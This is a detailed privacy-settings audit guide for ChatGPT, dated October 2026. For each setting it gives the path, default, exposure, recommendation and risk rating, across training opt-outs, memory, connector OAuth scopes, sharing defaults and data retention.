# ChatGPT (OpenAI)

> **Last verified:** 2026-10-02
> **Surfaces covered:** chatgpt.com · desktop & mobile apps · ChatGPT Work / cloud browser · browser extension · Computer Use · Codex (local + Cloud) · Business / Enterprise / Edu admin plane · OpenAI API platform

## Access and naming notes

- `help.openai.com`, `openai.com` and `platform.openai.com` return **HTTP 403** to automated fetches (Cloudflare). Official pages were read in a logged-in browser or via a text proxy. **Live admin consoles could not be rendered** without an authenticated admin session; admin deep links below are *documented*, not render-verified.
- **Settings deep links use path routes, not hashes.** Verified live: `/settings/data-controls`, `/settings/personalization`, `/settings/voice`, `/settings/plugins-settings`, `/settings/cloud-computer`, `/settings/notifications`, `/settings/general-settings`. `chatgpt.com/settings/apps` **redirects** to `/settings/general-settings`.
- **Renames that break older guidance:** ChatGPT **Team → Business** (2025-08-29) · **Connectors → Apps → Plugins** (the member pane is now `Settings → Plugins`) · **Library → Space** · **Advanced Voice Mode → ChatGPT Voice**.
- **URL churn:** `platform.openai.com/docs/*` → `developers.openai.com/api/docs/*` · `developers.openai.com/codex/*` → `learn.chatgpt.com/docs/*` · `chatgpt.com/admin/*` is migrating to `admin.openai.com`.
- **Live plan set:** Free, Go, Plus, Pro, Business, Enterprise, Edu, ChatGPT for Teachers, ChatGPT for Healthcare.

## Three retirements that reframe any older audit

1. **ChatGPT agent / "agent mode" is retired.** Verbatim banner: *"ChatGPT agent is no longer available. Use ChatGPT Work for longer, multi-step tasks and finished deliverables."* **Operator** was folded into agent mode first and is doubly gone. `verified`
2. **ChatGPT Atlas is dead.** *"Atlas is scheduled to stop working on August 9, 2026."* Its help articles are **still live with no deprecation banner**, which actively misleads. `verified`
3. **Sora was discontinued** (web/app 2026-04-26; API 2026-09-24). **The entire cameo likeness-consent model no longer exists.** `verified`

Also sunsetting: **custom GPTs** (Enterprise retirement 2026-12-11; personal accounts can no longer create them) and **group chats** (wind-down began 2026-07-09).

## 1. Training on your data

- **Setting:** `Improve the model for everyone`
- **Where:** Settings → Data controls. `https://chatgpt.com/settings/data-controls`. Mobile: sidebar → profile → Settings → Data controls. Signed-out: same toggle, saved per browser.
- **Default:** **ON for personal Free / Go / Plus / Pro.** Verbatim: *"If you are on a ChatGPT Plus, ChatGPT Pro or ChatGPT Free plan on a personal workspace, data sharing is enabled for you by default."* Corroborated by the parental-controls article: *"Improve the model for everyone … **Default: Enabled**."* **OFF for Business / Enterprise / Edu / Healthcare:** *"By default, OpenAI does not use content from ChatGPT Business, Enterprise, Edu, or ChatGPT for Healthcare workspaces to train its models."*
- **Exposes:** At default on a personal plan: new conversations, Voice *transcripts*, ChatGPT Record transcripts and canvases, Space/Sites authoring chats, connected-app content that lands in a chat, and saved memories all enter OpenAI's model-training corpus.
- **Recommend:** Off. The master switch — it also governs Codex tasks on personal plans.
- **Risk:** High
- **Evidence:** https://help.openai.com/en/articles/8983130-what-if-i-want-to-keep-my-history-on-but-disable-model-training ; https://help.openai.com/en/articles/12315553-managing-parental-controls-in-chatgpt — checked 2026-10-02
- **Confidence:** `verified` (both the personal default-on and the managed-workspace default-off)

- **Setting:** Thumbs up / thumbs down *(training carve-out, no toggle)*
- **Default:** Always active, and it **overrides your opt-out.** Verbatim: *"If you choose to provide feedback, such as selecting thumbs up or thumbs down on a response, the entire conversation associated with that feedback may be used to train OpenAI models,"* explicitly *"even if you've opted out."*
- **Exposes:** One click on a rating pushes that entire conversation into training, regardless of your Data controls setting.
- **Recommend:** **Never rate a response in a conversation containing client or personal data.** Whether this carve-out applies inside Business/Enterprise/Edu workspaces is **not stated anywhere** — treat it as a live risk there too.
- **Risk:** High
- **Confidence:** `verified` (the carve-out); `unresolved` (its applicability to managed workspaces)

- **Setting:** `Do not train on my content` *(Privacy Portal)*
- **Where:** OpenAI Privacy Portal → Make a Privacy Request → verify account → Do not train on my content. `https://privacy.openai.com/policies`
- **Default:** Not submitted. **Consumer ChatGPT only** — verbatim: *"This portal does NOT apply to OpenAI's business offerings including ChatGPT Enterprise, ChatGPT Business, ChatGPT Edu and our API platform."*
- **Recommend:** Use it in addition to the toggle if you want an opt-out that survives UI changes; OpenAI states it *"continues to honor the opt-out associated with the account."* *"Either option is sufficient for ChatGPT conversations and Codex tasks. You don't need to do both."*
- **Risk:** Low
- **Confidence:** `verified`

- **Setting:** `Include environments` *(Codex)*
- **Where:** Codex settings → General. `https://chatgpt.com/codex/cloud/settings/general`
- **Default:** `unresolved` — the article states only that it is *"a separate Include environments setting"* and that *"Changing your ChatGPT setting or opting out through the Privacy Portal does not change that setting."*
- **Exposes:** Repo and environment metadata can be used for training, **independently of every other opt-out.**
- **Recommend:** Off. **The one training path that survives both the master opt-out and the Privacy Portal request.**
- **Risk:** Medium
- **Confidence:** `verified` (exists, is independent); `unresolved` (default)

- **Setting:** `Include your audio recordings` / `Include your video recordings`
- **Where:** Settings → Data controls — turn on *Improve the model for everyone* first. **Mobile-first**; these rows did not render in the live web pane.
- **Default:** Off (opt-in). Documented only as something you "turn on"; OpenAI never prints "off by default". **Video is not available at all** in Business, Enterprise or Edu.
- **Exposes:** Raw voice recordings (Voice *and* dictation clips) and camera/screen-share video clips go to OpenAI for training, and *"our teams may review shared clips."*
- **Recommend:** Off. **These are the only toggles that send actual audio and video rather than transcripts.**
- **Risk:** High
- **Confidence:** `verified` (labels, opt-in mechanics, plan restriction); `reported` (literal default state)

> **There is no toggle called "Improve voice for everyone."** That label does not exist. Any guide using it is wrong.

- **Setting:** Google connected-app training carve-out *(no toggle)*
- **Default:** Protective, and stricter than the general rule. Verbatim: *"We do not train our generalized models on data directly from connected Google apps or derivations of that data, or use that data to target or serve advertisements, except: when a conversation is submitted as feedback … manually copied, pasted, or uploaded data … or included in ChatGPT's response."* Holds *"Even if this setting is enabled."*
- **Recommend:** Rely on it, but note **the three exceptions are exactly what normal use produces.** The thumbs-up exception is the leak.
- **Risk:** Medium
- **Confidence:** `verified`

- **Setting:** OpenAI Support conversations
- **Default:** Governed by *Improve the model for everyone*: *"Conversations with OpenAI Support may be used to improve OpenAI services, including our models, if Improve the model for everyone is enabled."* Every help article footer also carries *"Calls may be recorded to improve OpenAI services"* for the support line.
- **Recommend:** Opt out before contacting support about anything sensitive.
- **Risk:** Low
- **Confidence:** `verified`

## 2. Memory, history & personalization

- **Setting:** `Enable memory` *("Let ChatGPT personalize your experience based on your chats, files, and connected apps.")*
- **Where:** Settings → Personalization → Memory. `https://chatgpt.com/settings/personalization`
- **Default:** `unresolved` for consumer plans — no out-of-box state published. **Verified exceptions:** for a linked teen account, *Reference saved memories* is *"Default: Enabled where available; may be disabled by default in some regions."* In **ChatGPT for Healthcare and Enterprise with Regulated Workspace, improved memory is disabled by default.**
- **Exposes:** Memory draws on *"past chats, saved memories, custom instructions, files in Library, content from connected apps, such as Gmail."* It also **rewrites your web-search queries** — OpenAI's own example turns "restaurants near me" into "good vegan restaurants San Francisco" sent to search partners. If ads personalization is on, memory feeds ad selection.
- **Recommend:** Off, or at minimum turn off *Reference chat history*, if you handle client data. Admins can lock it workspace-wide.
- **Risk:** High
- **Confidence:** `verified` (labels, path, behavior, the two documented defaults); `unresolved` (consumer default)

- **Setting:** `Reference chat history`
- **Default:** `unresolved`. Dependency verified: *"If your settings include Reference saved memories, turning it off also turns off Reference chat history."*
- **Exposes:** ChatGPT mines every past conversation for context in new ones, with *"no separate storage limit."*
- **Recommend:** Off. Deletion is genuinely remediable here: *"If you turn Reference chat history off, information remembered from past chats is scheduled for deletion from OpenAI systems within 30 days."*
- **Risk:** High
- **Confidence:** `verified` (behavior, deletion window); `unresolved` (default)

- **Setting:** Memory summary (improved memory) vs Saved memories (legacy)
- **Where:** Settings → Personalization → Memory → **Manage**
- **Default:** Improved memory. **For Enterprise/Edu it was flipped ON by default** after a ~2-week early-access window announced 2026-06-25 — *"After early access, it will turn on by default for eligible workspaces unless an admin opts out."*
- **Exposes:** A continuously updated broad summary of your context. OpenAI states improved memory *"is not covered under your BAA"* and PHI must not be entered.
- **Recommend:** Review the summary; use **Delete and turn off memory** if you want it gone. Note *"Don't mention this again"* only *"reduces future references"* — it does not delete the source. **The highest-value Enterprise toggle to audit, because it turned itself on.**
- **Risk:** High
- **Confidence:** `verified`

- **Setting:** Project-only memory vs Default memory
- **Where:** Project → ••• → Project settings → Memory. Changes take a few hours.
- **Default:** Per-project, chosen at creation. **Shared projects are automatically project-only and cannot be switched back.**
- **Exposes:** Under project-only memory, *"Chats cannot reference conversations outside the project … and chats outside the project cannot reference conversations in it."* Switching to it *removes* that project's information from memory used elsewhere.
- **Recommend:** **On for every sensitive engagement — the cleanest containment primitive OpenAI ships.** Caveats: *"ChatGPT Work is not available in the project"* under project-only memory, and there is no global setting to apply it to all projects.
- **Risk:** Low *(it reduces exposure)*
- **Confidence:** `verified`

- **Setting:** `Reference record history` *("Let ChatGPT reference all previous recording transcripts and notes when responding.")*
- **Where:** Settings → Personalization. Admin-lockable at Settings → Workspace Controls.
- **Default:** `unresolved`
- **Exposes:** Every past meeting transcript and canvas becomes retrievable context in unrelated future chats.
- **Recommend:** **Off if you record client calls — it cross-contaminates contexts between clients.** Deletion lag is real: *"It may take a few days for deleted canvases and transcripts to stop being referenced in your chats."*
- **Risk:** High
- **Confidence:** `verified` (label, path, admin lock); `unresolved` (default)

- **Setting:** `Reference my writing style` *("Let ChatGPT use your chats, Library files, and connected apps to write in your style.")*
- **Default:** `unresolved`
- **Recommend:** Off if connected apps include client email.
- **Risk:** Medium
- **Confidence:** `verified` (exists, exact label); `unresolved` (default)

- **Setting:** `Reference photo` / `Full-body reference photo`
- **Where:** Settings → Personalization → **Reference photos**
- **Default:** **Empty / not set** — both rows show an **Add** affordance (verified in the live UI).
- **Exposes:** A persistent, account-linked photo of your face and body, stored by OpenAI and reused automatically for image generation and virtual try-on — *"saved for future try-ons, so you can reuse them without uploading them each time."*
- **Recommend:** **Leave both empty.** The highest-sensitivity biometric-adjacent store in the consumer product, and it has **no dedicated privacy toggle** — only add and delete. **No OpenAI statement excludes reference photos from training**, so the general *Improve the model for everyone* regime appears to apply.
- **Risk:** High
- **Confidence:** `verified` (existence, labels, path, empty-by-default); `unresolved` (training treatment)

- **Setting:** Custom instructions
- **Where:** Settings → Personalization → Custom instructions. Mobile: Settings → Customize ChatGPT.
- **Default:** Empty. Limits: 1,500 chars on Free/Go; 5,000 on Plus/Pro/Business/Enterprise/Edu.
- **Exposes:** Verbatim: *"Information from your use of custom instructions will also be used to improve model performance."* Applied *"immediately across all chats (including existing conversations)."*
- **Recommend:** Keep generic. **Do not put client names, health details, or addresses here** — this field is trained on and is **not** covered by the Google-connector carve-out. Prefer project instructions, which are scoped.
- **Risk:** Medium
- **Confidence:** `verified`

- **Setting:** `Library search` / `Connector search` / `Suggested prompts` / `Fast answers` / `Web search`
- **Where:** Settings → Personalization → *Additional ChatGPT settings*
- **Default:** `unresolved` per toggle. **Verified:** automatic referencing of Library files is **off by default for Healthcare workspaces**.
- **Exposes:** *Connector search* and *Suggested prompts* let ChatGPT reach into Gmail, Drive, Slack and other connected sources **without you asking**.
- **Recommend:** Turn off *Connector search*, *Suggested prompts* and *Library search*, then attach sources deliberately. **These are the quiet "reach into everything" switches.**
- **Risk:** Medium
- **Confidence:** `verified` (labels, paths, Healthcare default); `unresolved` (consumer defaults)

- **Setting:** Temporary chat, and the Personalized / Unpersonalized choice
- **Where:** New chat → **Temporary** → choose **Personalized** or **Unpersonalized** *before* the first message
- **Default:** **Personalization is on by default for temporary chats**, and **the choice cannot be changed after the conversation starts.**
- **Exposes:** Temporary chats *"do not appear in your chat history … do not create or update memories … are not used to improve OpenAI models,"* and *"may be retained for up to 30 days for safety purposes."* No ads. **Unpersonalized** additionally blocks memory, custom instructions and plugins.
- **Recommend:** The best per-session tool for sensitive work — **always pick Unpersonalized.** Saving one converts it to a regular chat under your normal settings. For Enterprise, temporary chats are still in the Compliance API for 30 days *"including when the workspace has a different custom retention period."*
- **Risk:** Low
- **Confidence:** `verified`

- **Setting:** `Computer History`
- **Where:** macOS desktop app → Settings → Integrations → Computer history → Turn on. Permissions sub-page: **Exclude these apps / Exclude these websites / Include only these apps / Include only these websites**. Pause/Resume from the menu bar. Admin grant: **Enable Computer History** in Workspace Settings → Permissions & roles.
- **Default:** **Off by default** — stated explicitly — for Pro, Business and Enterprise on macOS. Requires Memories. Business/Enterprise additionally need an admin grant, and **the admin grant alone does not opt anyone in.**
- **Exposes:** An interaction-event stream from allowed apps and websites — clicks, typing, shortcuts, app switches, plus accessibility-exposed context — turned into text summaries and local memory files ChatGPT and Codex can reference. **No** screenshots, **no** microphone or system audio; private-mode browsing never included.
- **Recommend:** Leave off. If on, use the **include-only** lists (allowlists fail safe; excludelists fail open) and pause during calls. OpenAI's own guidance: *"Turn it off during communications with other people unless you have their prior express consent."*
- **Risk:** High
- **Confidence:** `verified` (default-off, mechanics); `unresolved` (which apps/sites are pre-selected at turn-on)

## 3. Connectors & OAuth scopes

> Terminology: an **app** connects to an external service; a **plugin** bundles apps and/or skills. The member pane is now `Settings → Plugins`.

- **Setting:** Default permission — Always ask / Allow read actions / Allow low-risk actions / Allow all actions
- **Where:** Settings → **Plugins** → Permissions. Per connected account: Plugins → plugin → Connected accounts → ••• → Settings → Permissions. Live UI abbreviates to **Allow low-risk tools** / **Allow all tools**.
- **Default:** **Allow low-risk actions.** Verbatim: *"Allow low-risk actions applies when no account, workspace, app, or connection setting overrides it"* — and if you make no changes, *"ChatGPT can use your information when relevant without asking for permission each time, unless you are attempting a sensitive action."* **Confirmed live** — the account-wide Default permission row read "Allow low-risk tools." **Allow all actions** exists only per app/connected account and *"carries elevated risk."*
- **Exposes:** At default, ChatGPT reads from and acts in your connected services **without asking each time.** Changing it does not grant new access — *"Changing an app permission only changes when ChatGPT asks before using the access the app already has."*
- **Recommend:** **Always ask**, or at most **Allow read actions**, for anything that can send mail, post, pay or delete. Never **Allow all actions**.
- **Risk:** High
- **Confidence:** `verified` (default confirmed in docs *and* the live account-wide selector)

- **Setting:** Approval card — Deny / Allow once / Allow low-risk actions / Always allow
- **Default:** Prompt appears per the active permission. Verbatim limit: *"**Always allow** is not offered as a persistent permission to managed-workspace members, for automatically available connections, or for actions that require additional safety review."*
- **Exposes:** Actions flagged for review include sending email/messages/invitations, creating/editing/deleting files or records, changing account/access/sharing/security settings, purchases, and sharing sensitive personal/financial/health/identity data. Some requests are **denied rather than prompted.**
- **Recommend:** **Allow once**, every time.
- **Risk:** High
- **Confidence:** `verified`

- **Setting:** Google app OAuth scopes
- **Default:** Documented verbatim: Gmail → **`gmail.modify`**. Calendar → `calendar.events`, `meetings.space.readonly`. BigQuery → `bigquery`, `bigquery.readonly`, `bigquery.insertdata`. Contacts → `contacts.readonly`, `contacts.other.readonly`. Drive → `drive.readonly`, `drive.metadata.readonly`, `drive.activity.readonly`, **`drive`** (full). Docs → `documents`, `documents.readonly`. Sheets → `spreadsheets`, `spreadsheets.readonly`. Slides → `presentations`, `presentations.readonly`.
- **Exposes:** ⚠️ **`gmail.modify` is read *and* write** — it can modify and label your mail, not just read it. **`auth/drive` is full Drive access**, not read-only. **These are the two scopes people assume are narrower than they are.**
- **Recommend:** Disable Drive/Docs/Sheets/Slides *write* actions in ChatGPT so the write scopes aren't requested; have your Google Workspace admin approve only the read scopes. OpenAI's own decision rule: *"If you do not want to approve a Google scope, disable every ChatGPT action that requires that scope."* Note *"Existing Google app connections are not removed when new scopes are introduced."*
- **Risk:** High
- **Evidence:** https://help.openai.com/en/articles/10408842-google-app-data-controls-faq — checked 2026-10-02
- **Confidence:** `verified`

- **Setting:** Microsoft Graph consent (`Configure Microsoft permissions`)
- **Where:** Admin → Plugins → Configure Microsoft permissions → Review permissions in Microsoft Entra
- **Default:** Not granted until an Entra admin consents org-wide.
- **Exposes:** Grants the verified **ChatGPT / OpenAI, L.L.C.** application Graph scopes across your Entra tenant — and *"a single permission request in ChatGPT may cover multiple apps."* **The Entra confirmation screen has no per-permission checkboxes: accept-all or cancel.**
- **Recommend:** **Trim the permission selection inside ChatGPT *before* leaving for Entra** — Entra gives you no second chance.
- **Risk:** High
- **Confidence:** `verified`

- **Setting:** What a connected app receives beyond what you point at
- **Default:** Broader than most users expect. Verbatim: *"the app may access and use relevant context from your ChatGPT conversations"*; if Memory is on *"it may also leverage relevant information from memories"*; and apps *"may also see basic information typically shared when you visit a website, such as your IP address, device or browser type, language and region settings, and approximate location."* ChatGPT may also **save memories** from app data.
- **Recommend:** Enable only the apps the current task needs; disconnect afterward. Turn Memory off before sensitive sessions. **Disconnecting *"does not delete past conversations that already used app content."***
- **Risk:** High
- **Confidence:** `verified`

- **Setting:** Sign in with ChatGPT *(outbound OAuth)*
- **Where:** Settings → Security and login → Login connections → Sign in with ChatGPT → Manage connection → Disconnect
- **Default:** **Enabled for organizations with no explicit identity policy** — verbatim. Available globally, including Enterprise.
- **Exposes:** Identity sign-in shares *"only your name, email address, and profile picture."* It does **not** share conversations, memory, files, tokens or billing. **But** an app can **separately** request delegated access — e.g. *"a ChatGPT Site can request access to your connected apps."*
- **Recommend:** Use only for apps you trust, and **decline the separate delegated-access step.** Sign-in-only connections may show no **Disconnect** control at all — signing out of the app *"does not disconnect it from ChatGPT."*
- **Risk:** Medium
- **Confidence:** `verified`

- **Setting:** `Let apps use credits after reaching plan limits`
- **Default:** **Off.** Verbatim: *"This is off by default and applies across participating apps."* Plan sharing is Plus/Pro only.
- **Exposes:** Financial rather than data exposure: with automatic credit purchases also enabled, *"continued usage can result in automatic charges,"* and *"You may not receive a separate notice when your included usage limit is reached."*
- **Recommend:** Leave off, and set per-app weekly limits below 100% — *"An app limit below 100% prevents credit use for that app."*
- **Risk:** Medium
- **Confidence:** `verified`

- **Setting:** `Developer mode` / `Create custom MCP connectors`
- **Where:** Enterprise/Edu — admin grant at Workspace Settings → Permissions & Roles → Connected Data, then each user self-enables at Settings → Apps → Advanced Settings. Business — admins/owners only.
- **Default:** Off. **Business and Enterprise/Edu only, ChatGPT web only.** Each admin/owner must enable it individually. New actions pulled via **Refresh** are **deselected by default.**
- **Exposes:** Full MCP including **write/modify** actions. Verbatim: *"Connecting to unsafe or untrusted MCP servers may increase exposure to security risks (including prompt injection). Only connect servers you trust,"* and *"Custom apps are not verified by OpenAI and are intended for developer use only."* Approval is a **frozen snapshot**: *"Changes made later by the app's developer are not applied until an admin reviews and publishes an update."* **Admins are not notified when a changed app starts erroring.**
- **Recommend:** Off for all roles; grant to a small named developer group with a security review before any publish. Configure OAuth with `offline_access` or ChatGPT loses access when authorization expires. **Mutually exclusive with Lockdown Mode.**
- **Risk:** High
- **Confidence:** `verified`

- **Setting:** `Allow use in Sites` *(per plugin)*
- **Default:** **"This setting is off by default."** Verified for Enterprise and Business.
- **Exposes:** Lets a workspace-built Site call a plugin using **each visitor's own** connected account — a path from one member's credentials into another member's page.
- **Recommend:** Keep off; enable only for a reviewed Site with a named owner.
- **Risk:** High
- **Confidence:** `verified`

- **Setting:** Remote MCP tool data handling *(API)*
- **Default:** Outside OpenAI's controls entirely: *"data sent to an MCP server is subject to their data retention policies."*
- **Recommend:** Treat every MCP server as a separate data processor requiring its own review. **ZDR and workspace retention do not reach it.**
- **Risk:** High
- **Confidence:** `verified`

## 4. Sharing & publication defaults

- **Setting:** `Share` *(conversation link)*
- **Where:** Conversation → Share → Create link. Manage at Settings → Data controls → **Shared links** → Manage; **More actions → Delete all shared links**.
- **Default:** **Anyone with the link, for personal accounts** — *"Anyone who has a link created from a personal account can view the shared conversation."* Links are **anonymous by default**, though *"Some existing or older sharing experiences may display the creator's name."* Managed-workspace links are restricted to the originating workspace.
- **Exposes:** A personal link is a public snapshot including supported images and uploaded files, forwardable by anyone. **The workspace variant is worse in one way:** *"a workspace conversation link can include messages added after sharing"* — it keeps leaking as you keep typing.
- **Recommend:** Audit Shared links periodically and delete what you no longer need. **There are no recipient-level controls and no expiration dates.** *"Shared link pages are not intended for search-engine indexing, but this does not make a link private."*
- **Risk:** High
- **Confidence:** `verified`

- **Setting:** `Share chats and scheduled tasks` *(workspace permission)*
- **Default:** `unresolved`. **Availability is tier-split and verified: Enterprise/Edu only.** The Business FAQ: *"**Can I disable shared links entirely?** No. This feature is available in ChatGPT Enterprise."*
- **Exposes:** **On Business you cannot turn off shared links at all.** A genuine tier gap, not a misconfiguration.
- **Recommend:** Off on Enterprise/Edu if you need sharing discipline. On Business, compensate with policy and training.
- **Risk:** High
- **Confidence:** `verified` (tier gap); `unresolved` (default)

- **Setting:** Shareable profile sharing level *(personal)*
- **Where:** `https://chatgpt.com/profile` → Share
- **Default:** **"Your personal profile is private by default."**
- **Exposes:** When public, *"anyone signed in to ChatGPT can view it"* — display name, photo, bio, activity (message counts, Work and Codex token usage, streaks), **your top plugins**, and showcased Sites. *"Shared profiles don't show conversation titles or content."*
- **Recommend:** Leave private. **The activity and top-plugins sections disclose your tooling and work rhythm.** You *"can't block specific people from viewing your profile."*
- **Risk:** Medium
- **Confidence:** `verified`

- **Setting:** Member profiles *(Business workspace)*
- **Default:** **Shared with the whole workspace.** Verbatim: *"Business profiles are shared with other members of the same workspace by default."*
- **Recommend:** Admins should consider setting all member profiles private. **Admin-locked: "Members can't change their workspace profile's sharing level themselves."**
- **Risk:** Medium
- **Confidence:** `verified`

- **Setting:** ChatGPT Sites — Who has access
- **Where:** Site → Share → Who has access → Publish. Admin page: Workspace settings → Sites.
- **Default:** **"A new Site is limited to its owner and workspace admins until access is changed."** Enablement is tier-split: **Business — Sites enabled by default**; **Enterprise/Edu — "ChatGPT Sites is default off."** And **"In Enterprise workspaces, public publishing is off by default and must be enabled by an admin."**
- **Exposes:** At **Anyone on the internet** the Site is a publicly reachable web app that may include *"ChatGPT prompts, instructions, conversation context, uploaded or referenced files, site code, generated artifacts."* **Every deployment URL is a production URL.** Sites supports **no data residency or inference residency.**
- **Recommend:** Keep public publishing and external-visitor invitations off. **Note an editor can publish later versions without owner approval** once the owner has published once.
- **Risk:** High
- **Confidence:** `verified`

- **Setting:** Project sharing — Only those invited / Anyone with a link
- **Default:** Private to the owner until shared. Collaborator caps: Pro 100 / Plus & Go 10 / Free 5.
- **Exposes:** At **Anyone with a link**, *"any logged-in ChatGPT user who has the link can join the shared project"* — gaining its chats, files and instructions, and the ability to download every file. **Members can see other members' names and email addresses.** Training nuance easy to miss: shared-project data *"may be used to improve models only when the project owner **and every contributor** have Improve the model for everyone turned on."*
- **Recommend:** **Only those invited**, always — only the owner can set link-open access. Editors can add members but not remove them.
- **Risk:** High
- **Confidence:** `verified`

- **Setting:** ChatGPT Space page sharing
- **Exposes:** The documented leak is indirect and worth quoting: *"if ChatGPT uses something from a previous conversation to help write a project brief, that information becomes visible to the people who can read the brief and they may remember relevant information from it if their Memory is enabled, even if yours is off."* Also: *"Adding a link to a separately stored file does not automatically give readers permission to open it"* — but content copied or summarized onto the page **is** visible to everyone.
- **Recommend:** **Read the page as a stranger would before sharing.** Memory-sourced personal context becomes shared content the moment it is written onto a page, and the recipient's memory — not yours — governs what happens next.
- **Risk:** High
- **Confidence:** `verified`

- **Setting:** GPT sharing level — Invite-only / Workspace link / Your workspace / Anyone with the link / GPT Store
- **Default:** `unresolved`. **Verified:** *"Personal ChatGPT accounts, including Free, Go, Plus, and Pro, cannot create or publish new GPTs."* Public publishing has a workspace kill switch. Public actions require a valid **Privacy Policy URL**.
- **Recommend:** Cap at **Your workspace**; disable public publishing. **Given the 2026-12-11 retirement, stop new GPT investment and migrate to plugins.**
- **Risk:** High
- **Confidence:** `verified` (controls, personal-account restriction); `unresolved` (default level)

- **Setting:** `Discoverable by workspace users` *(SCIM-managed groups)*
- **Where:** Workspace settings → Identity & access
- **Default:** **"enabled by default to preserve existing behavior."**
- **Exposes:** SCIM groups appear in project and GPT sharing pickers, so a member can share to a large synced group in one click.
- **Recommend:** **Disable.** OpenAI's own rationale is that it *"can help reduce accidental oversharing."* **The quietest high-value default on the platform.**
- **Risk:** High
- **Confidence:** `verified`

- **Setting:** Codex workspace share links
- **Default:** `unresolved`. *"Workspace share links are limited to authenticated members of the originating workspace, and admins can turn off workspace share links."*
- **Exposes:** A read-only snapshot of a Codex thread. *"Codex redacts known secret patterns, but users should review the snapshot because sensitive paths, diffs, images, or other content may remain."*
- **Recommend:** Off. **Redaction is best-effort and diffs leak file paths and structure.**
- **Risk:** High
- **Confidence:** `verified` (control exists); `unresolved` (label, path, default)

## 5. Retention & deletion

- **Setting:** Chat deletion *(30-day window)*
- **Default:** Regular and archived chats are retained **until you delete them**. On deletion: *"ChatGPT removes it from your account view immediately. OpenAI schedules it for permanent deletion from its systems within 30 days, unless it was already de-identified and disassociated from your account or OpenAI must retain it longer for security or legal obligations."*
- **Exposes:** **Nothing auto-expires.** Your entire conversation history persists indefinitely by default.
- **Recommend:** **Delete rather than archive** — *"Archiving a chat does not change its retention period"* and archived chats remain searchable.
- **Risk:** Medium
- **Confidence:** `verified`

- **Setting:** NYT litigation preservation order — **lifted**
- **Default:** **The order ended.** OpenAI's page, updated 2025-10-22: *"After months of litigation, we are no longer under a legal order to retain consumer ChatGPT and API content indefinitely. Our obligations under the earlier order ended on **September 26, 2025**."* Standard practice restored. The order had covered **Free, Plus, Pro and Team, plus non-ZDR API** — never Enterprise, Edu, or ZDR API customers.
- **Exposes:** What is still held: *"we will securely store limited historical April–September 2025 user data,"* accessible only to *"a small, audited OpenAI legal and security team."* EEA, Switzerland and UK conversations are excluded. Separately, a 2025-12-02 order directed production of a de-identified **20-million-ChatGPT-log** sample.
- **Recommend:** ⚠️ **This is the single most commonly stated-wrong fact about ChatGPT privacy.** Anything written before ~October 2025 claiming deleted chats are preserved indefinitely is now wrong. **But** if you promised a client deletion for April–September 2025 traffic on a consumer plan or non-ZDR API org, that promise was overridden — disclose rather than assume. The practical lesson: **a ZDR amendment was the only thing that insulated API customers, because data never stored cannot be preserved.**
- **Risk:** High *(for the April–September 2025 window)*; Low going forward
- **Evidence:** https://openai.com/index/response-to-nyt-data-demands/ ; CourtListener docket 1:23-cv-11195 — checked 2026-10-02
- **Confidence:** `verified` (order text, scope, ZDR exclusion, the Sept 26 2025 end, the Apr–Sep 2025 hold); `unresolved` (whether the 20M-log sample has been produced)

- **Setting:** Workspace data-retention policy
- **Where:** **`unresolved` — the largest documentation gap found.** OpenAI asserts repeatedly that admins control it (*"Your workspace admins control how long your customer content is retained"*) but **no article documents a click path or deep link.**
- **Default:** Options documented — **indefinite** or **time-bound** (*"90 days, 180 days, etc"*) for Enterprise/Edu/Healthcare. **ChatGPT Business: "Chats, files, and canvas documents are retained indefinitely"** with no documented alternative. The out-of-box Enterprise default is `unresolved`.
- **Recommend:** Set the shortest period your workflows tolerate and **get it in writing.** OpenAI's own caution: *"retention enables features like conversation history, and shorter retention periods may compromise product experience."*
- **Risk:** High
- **Confidence:** `verified` (options, tier split, Business=indefinite); `unresolved` (admin click path, Enterprise default)

- **Setting:** File retention — Space/Library, GPTs, projects, transient
- **Default:** All verified: *"Deleting a chat does not delete a file that remains saved in Library."* GPT knowledge files *"retained until the GPT is deleted."* Project files persist *"until the project or file is deleted."* **Enterprise transient files not saved to Library "can expire after 48 hours."** Deleted/expired Library files may persist in **backups for up to 30 additional days.**
- **Exposes:** **Deleting a conversation leaves its uploaded files behind — the most common false assumption about ChatGPT deletion.**
- **Recommend:** Treat file deletion as a separate task from chat deletion, every time.
- **Risk:** High
- **Confidence:** `verified`

- **Setting:** Memory deletion lag *(no toggle)*
- **Default:** Multi-step and incomplete by design: *"Deleting a chat alone does not necessarily delete a separate saved memory created from that chat,"* and *"OpenAI may retain logs of deleted saved memories for up to 30 days."*
- **Recommend:** To actually remove something: delete the memory summary entry **and** the saved memory **and** the original chat (regular and archived) **and** Space files **and** disconnect the relevant app. **There is no single "forget this" action.**
- **Risk:** High
- **Confidence:** `verified`

- **Setting:** Export data
- **Default:** Available to **Free, Go, Plus, Pro**. **Not available** in Business, Enterprise or Healthcare. **Edu: "Data export is off by default,"** admin-enabled.
- **Exposes:** Includes account details, uploaded and generated files, conversations, logs and payment information. **Scheduled tasks and shared task links are not included.** On Edu, the documented end state is **workspace data landing in personal ChatGPT accounts** — an explicit egress path out of your managed workspace.
- **Recommend:** Export before deleting anything irreversibly. **Edu admins: leave it off unless you have a specific need.**
- **Risk:** High *(Edu, when enabled)*; Low *(personal)*
- **Confidence:** `verified`

- **Setting:** Delete account
- **Default:** Free, Go, Plus, Pro only. **Not available in Business, Enterprise, Edu or Healthcare.** *"If you delete your account, we will delete your data within 30 days."*
- **Recommend:** Before deleting: cancel App Store / Play subscriptions separately, delete shared scheduled-task links (**they are not deleted with the account**), and check whether your email also accesses an **Ads account** — *"Deleting your OpenAI account may not pause or cancel active ad campaigns, which could continue serving and accruing charges."*
- **Risk:** Medium
- **Confidence:** `verified`

- **Setting:** Compliance Logs Platform retention
- **Default:** **30 days.** *"If longer retention is desired then consumers should implement a system to continuously download all logs."* Enterprise and Edu only.
- **Recommend:** Stand up continuous ingestion on day one. **Breaking change already shipped:** a new conversation-logs system released 2026-03-05 deprecated the old stateful route, **removed 2026-06-05**. Integrations predating that are already broken.
- **Risk:** Medium
- **Confidence:** `verified`

